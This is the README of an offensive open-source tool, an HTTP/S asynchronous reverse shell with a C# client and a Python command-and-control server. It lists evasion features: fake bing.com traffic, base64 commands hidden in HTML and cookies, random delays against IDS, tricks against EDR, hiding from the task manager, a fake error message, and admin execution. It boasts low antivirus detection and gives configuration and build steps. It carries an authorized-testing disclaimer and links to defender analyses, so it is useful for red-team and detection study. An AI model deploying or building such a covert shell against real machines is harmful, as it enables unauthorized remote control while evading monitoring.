# HTTP/S Asynchronous Reverse Shell

Table of contents

 1. [Introduction](#intro)
 2. [Features](#features)
 3. [Demonstration](#demo)
 4. [Configuration](#config)

------------

### Why ? 
<a name="intro"></a>

Today there are many ways to create a reverse shell in order to be able to remotely control a machine through a firewall. Indeed, outgoing connections are not always filtered.

However security software and hardware (IPS, IDS, Proxy, AV, EDR...) are more and more powerful and can detect those attacks. Most of the time the connection to a reverse shell is established through a L4 TCP tunnel.

I figured that the best way to stay undetected would be to make it look like legitimate traffic. The HTTP protocol (Layer 7) is the most used by a standard user. Moreover it is almost never filtered so as not to block access to websites.

The particularity of this POC is that the communication is completely asynchronous, and it only uses GET requests.

[![](https://github.com/onSec-fr/Http-Asynchronous-Reverse-Shell/blob/master/Images/Architecture.png?raw=true)](https://github.com/onSec-fr/Http-Asynchronous-Reverse-Shell/blob/master/Images/Architecture.png?raw=true)

### How it works ?
1) The client app is executed on the target machine.
2) The client initiates the connection with the server.
3) The server accepts the connection.

Then:  
-The client queries the server until it gets instructions.\
-The attacker provides instructions to the server.\
-When a command is defined, the client executes it and returns the result.

And so on, until the attacker decides to end the session.
[![](https://github.com/onSec-fr/Http-Asynchronous-Reverse-Shell/blob/master/Images/Concept.png?raw=true)](https://github.com/onSec-fr/Http-Asynchronous-Reverse-Shell/blob/master/Images/Concept.png?raw=true)

### Disclaimer

This tool is only intended to be a proof of concept demonstration tool for authorized security testing. Make sure you check with your local laws before running this tool.

------------

### Features 
<a name="features"></a>

Today, as a poc, the following functionalities are implemented: 

1. Fake HTTP traffic to appear as searches on bing.com.
2. Commands are base64 encoded in the HTML response.
3. The result of the commands is encoded in base64 as a cookie by the client.
4. [Optional] SSL support; by default it is a fake bing.com certificate.
5. Random delay between each client call to avoid triggering IDSs.
6. Random template is used for each response from the server.
7. Re-use of the same powershell process to avoid triggering EDRs.
8. Support for all Cmd and Powershell commands.
9. [Optional] The client can display a fake error message at startup.
10. The client is hidden from tasks manager.
11. [Optional] The client can be run as an administrator.

##### AV Detection

Only 3 out of 69 products were able to detect the client as malicious, without applying any evasive or obfuscation techniques.

[![](https://github.com/onSec-fr/Http-Asynchronous-Reverse-Shell/blob/master/Images/av_detection.png?raw=true)](https://github.com/onSec-fr/Http-Asynchronous-Reverse-Shell/blob/master/Images/av_detection.png?raw=true)

------------

### Demonstration
<a name="demo"></a>

**Client side**
[![](https://github.com/onSec-fr/Http-Asynchronous-Reverse-Shell/blob/master/Images/client_demo.gif?raw=true)](https://github.com/onSec-fr/Http-Asynchronous-Reverse-Shell/blob/master/Images/client_demo.gif?raw=true)

**Server side**
[![](https://github.com/onSec-fr/Http-Asynchronous-Reverse-Shell/blob/master/Images/server_demo.gif?raw=true)](https://github.com/onSec-fr/Http-Asynchronous-Reverse-Shell/blob/master/Images/server_demo.gif?raw=true)

------------

### Configuration
<a name="config"></a>

**Client : C Sharp**

1. Open *HARS.sln* in Visual Studio

**Config.cs**

This file contains parameters ; Assign the values you want :

    class Config
        {
            /* Behavior */
            // Display a fake error msg at startup
            public static bool DisplayErrorMsg = true;
            // Title of fake error msg
            public static string ErrorMsgTitle = "This application could not be started.";
            // Description of fake error msg
            public static string ErrorMsgDesc = "Unhandled exception has occured in your application. \r\r Object {0} is not valid.";
            // Min delay between the client calls
            public static int MinDelay = 2;
            // Max delay between the client calls
            public static int MaxDelay = 5;
            // Fake uri requested - Warning : it must begin with "search" (or need a change on server side)
            public static string Url = "search?q=search+something&qs=n&form=QBRE&cvid=";
            /* Listener */
            // Hostname/IP of C&C server
            public static string Server = "https://127.0.0.1";
            // Listening port of C&C server
            public static string Port = "443";
            // Allow self-signed or "unsecure" certificates - Warning : often needed in corporate environment using proxy
            public static bool AllowInsecureCertificate = true;
        }

**HARS.manifest**

Change this line to run by default the client with certain privileges : 

`<requestedExecutionLevel  level="requireAdministrator" uiAccess="false" />`  

With  
`<requestedExecutionLevel  level="asInvoker" uiAccess="false" />`  
or  
`<requestedExecutionLevel  level="requireAdministrator" uiAccess="false" />`  
or  
`<requestedExecutionLevel  level="highestAvailable" uiAccess="false" />`  

**Projet properties**

Here you can customize the assembly information and an icon for the file.

[![](https://github.com/onSec-fr/Http-Asynchronous-Reverse-Shell/blob/master/Images/project_config.png?raw=true)](https://github.com/onSec-fr/Http-Asynchronous-Reverse-Shell/blob/master/Images/project_config.png?raw=true)

Note : Target .NET framework version is set to 4.6 which is available by default in Windows 10.    
*For Windows 7, choose .NET 3.5 if you don't want to have to install missing features.*

#### Build

Build the project from Visual Studio.
The client should be generated in `Http Asynchronous Reverse Shell\HARS_Client\HARS\bin\Release` folder.

**Done!**

------------

**Server : Python**

**HARS_Server.py**
Location : `Http Asynchronous Reverse Shell\HARS_Server\www`

Simply change the port or location on the certificate if needed in the config section.

    # Config
    PORT = 443
    CERT_FILE = '../server.pem'

#### Run

`python HARS_Server.py`

#### Notes

-HTTP Logs are located in `Http Asynchronous Reverse Shell\HARS_Server\logs`\  
-You can add your own templates (any html page) in `Http Asynchronous Reverse Shell\HARS_Server\templates`

#### Review

A good review from the defender side by Lee Kirkpatric : https://community.rsa.com/community/products/netwitness/blog/2020/04/01/using-rsa-netwitness-to-detect-http-asynchronous-reverse-shell-hars  
Another deep analysis from Nasreddine Bencherchali : https://nasbench.medium.com/understanding-detecting-c2-frameworks-hars-682b30f0505c
Ty Guys  
#BlueTeam  

------------
@onSec-fr
